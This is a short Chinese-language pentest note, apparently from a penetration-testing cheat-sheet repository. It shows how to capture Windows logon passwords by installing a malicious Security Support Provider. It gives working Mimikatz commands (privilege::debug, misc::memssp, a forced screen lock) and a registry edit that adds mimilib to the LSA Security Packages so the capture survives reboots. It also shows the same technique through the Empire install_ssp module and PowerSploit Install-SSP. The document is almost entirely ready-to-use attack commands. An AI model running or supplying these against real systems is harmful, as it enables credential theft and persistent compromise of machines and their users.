	需高权限
  #### Mimikatz
	重启失效
	>privilege::debug
	>misc::memssp
	锁屏
	>rundll32.exe user32.dll,LockWorkStation
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/544.png)

	登录的账号密码保存在
	C:\Windows\System32\mimilsa.log
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/545.png)

	重启有效
	将mimikatz中的mimilib.dll放入system32目录
	>reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages" 查看注册表
	>reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ  添加mimilib
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/546.png)

	有账号登录密码保存在C:\Windows\System32\kiwissp.log重启也有效
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/547.png)
  #### Empire
	复制mimilib.dll到system32文件夹中
	>shell copy mimilib.dll C:\Windows\System32\
	使用模块
	>usemodule persistence/misc/install_ssp*
	>set Path C:\Users\Administrator\mimilib.dll
  #### Powersploit
	>Import-Module .\PowerSploit.psm1
	>Install-SSP -Path .\mimilib.dll